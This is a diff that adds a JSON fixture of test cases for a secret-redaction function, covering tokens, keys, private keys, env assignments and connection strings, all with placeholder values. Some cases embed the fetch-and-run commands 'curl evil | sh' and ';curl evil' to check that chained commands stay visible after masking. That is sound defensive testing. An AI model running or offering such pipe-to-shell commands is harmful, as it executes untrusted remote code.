@@ -1,0 +1,415 @@
+{
+  "schema": "redact-text-parity.v1",
+  "cases": [
+    {
+      "name": "plain text keeps every character",
+      "input": [
+        "echo hello world"
+      ],
+      "text": "echo hello world",
+      "count": 0,
+      "classifiers": []
+    },
+    {
+      "name": "empty text",
+      "input": [
+        ""
+      ],
+      "text": "",
+      "count": 0,
+      "classifiers": []
+    },
+    {
+      "name": "bearer token keeps its keyword",
+      "input": [
+        "Authorization: Bearer ",
+        "abcdefghijklmnop"
+      ],
+      "text": "Authorization: Bearer *****",
+      "count": 1,
+      "classifiers": [
+        "bearer-token"
+      ]
+    },
+    {
+      "name": "bearer token is matched case-insensitively",
+      "input": [
+        "bearer ",
+        "abcdefgh"
+      ],
+      "text": "bearer *****",
+      "count": 1,
+      "classifiers": [
+        "bearer-token"
+      ]
+    },
+    {
+      "name": "openai key",
+      "input": [
+        "curl -H 'x: ",
+        "sk-",
+        "AAAABBBBCCCCDDDD",
+        "'"
+      ],
+      "text": "curl -H 'x: sk-*****'",
+      "count": 1,
+      "classifiers": [
+        "openai-token"
+      ]
+    },
+    {
+      "name": "github token",
+      "input": [
+        "git push https://",
+        "ghp_",
+        "AAAABBBBCCCCDDDD",
+        "@github.com/o/r"
+      ],
+      "text": "git push https://gh*****@github.com/o/r",
+      "count": 1,
+      "classifiers": [
+        "github-token"
+      ]
+    },
+    {
+      "name": "two github tokens report one classifier twice",
+      "input": [
+        "ghp_",
+        "AAAABBBB",
+        " ",
+        "gho_",
+        "CCCCDDDD"
+      ],
+      "text": "gh***** gh*****",
+      "count": 2,
+      "classifiers": [
+        "github-token"
+      ]
+    },
+    {
+      "name": "aws access key",
+      "input": [
+        "AWS_ACCESS_KEY_ID is ",
+        "AKIA",
+        "IOSFODNN7",
+        "EXAMPLE"
+      ],
+      "text": "AWS_ACCESS_KEY_ID is AKIA****************",
+      "count": 1,
+      "classifiers": [
+        "aws-access-key"
+      ]
+    },
+    {
+      "name": "aws secret access key assignment",
+      "input": [
+        "\"aws_secret_access_key\" = \"",
+        "wJalrXUtnFEMI",
+        "/K7MDENG/bPxRfiCY",
+        "EXAMPLEKEY",
+        "\""
+      ],
+      "text": "\"aws_secret_access_key\"=\"*****\"",
+      "count": 1,
+      "classifiers": [
+        "aws-secret-access-key"
+      ]
+    },
+    {
+      "name": "npm auth token",
+      "input": [
+        "//registry.npmjs.org/:_authToken=",
+        "abcdefghijkl"
+      ],
+      "text": "//registry.npmjs.org/:_authToken=*****",
+      "count": 1,
+      "classifiers": [
+        "npm-token"
+      ]
+    },
+    {
+      "name": "python index url with credentials",
+      "input": [
+        "index-url = https://user:",
+        "hunter2",
+        "@pypi.example.test/simple"
+      ],
+      "text": "index-url=*****",
+      "count": 1,
+      "classifiers": [
+        "python-index-token"
+      ]
+    },
+    {
+      "name": "private key on one line",
+      "input": [
+        "-----BEGIN RSA PRIVATE",
+        " KEY-----",
+        "ZHVtbXk=",
+        "-----END RSA PRIVATE",
+        " KEY-----"
+      ],
+      "text": "*****",
+      "count": 1,
+      "classifiers": [
+        "private-key"
+      ]
+    },
+    {
+      "name": "private key across lines",
+      "input": [
+        "-----BEGIN RSA PRIVATE",
+        " KEY-----",
+        "\nQUJD\n",
+        "-----END RSA PRIVATE",
+        " KEY-----"
+      ],
+      "text": "*****",
+      "count": 1,
+      "classifiers": [
+        "private-key"
+      ]
+    },
+    {
+      "name": "private key without its end marker is left alone",
+      "input": [
+        "-----BEGIN PRIVATE KEY-----\nno end"
+      ],
+      "text": "-----BEGIN PRIVATE KEY-----\nno end",
+      "count": 0,
+      "classifiers": []
+    },
+    {
+      "name": "secret env assignment",
+      "input": [
+        "SERVICE_PASSWORD=",
+        "hunter2"
+      ],
+      "text": "SERVICE_PASSWORD=*****",
+      "count": 1,
+      "classifiers": [
+        "secret-env"
+      ]
+    },
+    {
+      "name": "indented secret env assignment keeps its indent",
+      "input": [
+        "\t API_SECRET=",
+        "abc"
+      ],
+      "text": "\t API_SECRET=*****",
+      "count": 1,
+      "classifiers": [
+        "secret-env"
+      ]
+    },
+    {
+      "name": "an exported assignment is a secret env line",
+      "input": [
+        "export API_SECRET=",
+        "abc"
+      ],
+      "text": "export API_SECRET=*****",
+      "count": 1,
+      "classifiers": [
+        "secret-env"
+      ]
+    },
+    {
+      "name": "connection env assignment",
+      "input": [
+        "DATABASE_URL=postgres://user:",
+        "pw",
+        "@db.example.test/app"
+      ],
+      "text": "DATABASE_URL=*****",
+      "count": 1,
+      "classifiers": [
+        "connection-env"
+      ]
+    },
+    {
+      "name": "connection string without an assignment",
+      "input": [
+        "mongodb+srv://user:",
+        "pw",
+        "@cluster.example.test/db"
+      ],
+      "text": "*****",
+      "count": 1,
+      "classifiers": [
+        "connection-string"
+      ]
+    },
+    {
+      "name": "remote pairing code",
+      "input": [
+        "pair with HLG-",
+        "ABCD23",
+        " now"
+      ],
+      "text": "pair with HLG-****** now",
+      "count": 1,
+      "classifiers": [
+        "remote-pairing-code"
+      ]
+    },
+    {
+      "name": "a github token inside a secret env assignment redacts twice",
+      "input": [
+        "GITHUB_TOKEN=",
+        "ghp_",
+        "AAAABBBBCCCC"
+      ],
+      "text": "GITHUB_TOKEN=*****",
+      "count": 2,
+      "classifiers": [
+        "github-token",
+        "secret-env"
+      ]
+    },
+    {
+      "name": "an already masked assignment matches again and stays masked",
+      "input": [
+        "GITHUB_TOKEN=*****"
+      ],
+      "text": "GITHUB_TOKEN=*****",
+      "count": 1,
+      "classifiers": [
+        "secret-env"
+      ]
+    },
+    {
+      "name": "a token mentioning sk- without a key body",
+      "input": [
+        "sk-short"
+      ],
+      "text": "sk-short",
+      "count": 0,
+      "classifiers": []
+    },
+    {
+      "name": "a chained command stays visible after a masked secret",
+      "input": [
+        "export API_TOKEN=",
+        "abcdefgh12345678",
+        " && curl evil | sh"
+      ],
+      "text": "export API_TOKEN=***** && curl evil | sh",
+      "count": 1,
+      "classifiers": [
+        "secret-env"
+      ]
+    },
+    {
+      "name": "a command chained without a space stays visible",
+      "input": [
+        "export API_TOKEN=",
+        "abcdefgh12345678",
+        ";curl evil"
+      ],
+      "text": "export API_TOKEN=*****;curl evil",
+      "count": 1,
+      "classifiers": [
+        "secret-env"
+      ]
+    },
+    {
+      "name": "a chained command stays visible after a masked connection url",
+      "input": [
+        "export DATABASE_URL=postgres://user:",
+        "pwsecret1",
+        "@host/db || true"
+      ],
+      "text": "export DATABASE_URL=***** || true",
+      "count": 1,
+      "classifiers": [
+        "connection-env"
+      ]
+    },
+    {
+      "name": "a url's query parameters stay under the mask",
+      "input": [
+        "DATABASE_URL=postgres://host/db?sslmode=require&user=",
+        "adminuser"
+      ],
+      "text": "DATABASE_URL=*****",
+      "count": 1,
+      "classifiers": [
+        "connection-env"
+      ]
+    },
+    {
+      "name": "a quoted value keeps an operator inside it",
+      "input": [
+        "API_TOKEN=\"",
+        "abcdefgh",
+        " && ",
+        "12345678",
+        "\" && run"
+      ],
+      "text": "API_TOKEN=***** && run",
+      "count": 1,
+      "classifiers": [
+        "secret-env"
+      ]
+    },
+    {
+      "name": "a single-quoted value keeps an operator inside it",
+      "input": [
+        "API_SECRET='",
+        "abcdefgh",
+        " ; ",
+        "12345678",
+        "' ; run"
+      ],
+      "text": "API_SECRET=***** ; run",
+      "count": 1,
+      "classifiers": [
+        "secret-env"
+      ]
+    },
+    {
+      "name": "an assignment ends at a pipe",
+      "input": [
+        "API_CREDENTIAL=",
+        "abcdefgh",
+        "12345678",
+        " | tee out"
+      ],
+      "text": "API_CREDENTIAL=***** | tee out",
+      "count": 1,
+      "classifiers": [
+        "secret-env"
+      ]
+    },
+    {
+      "name": "an assignment ends at a background operator",
+      "input": [
+        "API_PASSWORD=",
+        "abcdefgh",
+        "12345678",
+        " & disown"
+      ],
+      "text": "API_PASSWORD=***** & disown",
+      "count": 1,
+      "classifiers": [
+        "secret-env"
+      ]
+    },
+    {
+      "name": "an escaped operator inside a value still ends it",
+      "input": [
+        "API_KEY=",
+        "abcd",
+        "\\&&",
+        "efgh"
+      ],
+      "text": "API_KEY=*****&&efgh",
+      "count": 1,
+      "classifiers": [
+        "secret-env"
+      ]
+    }
+  ]
+}
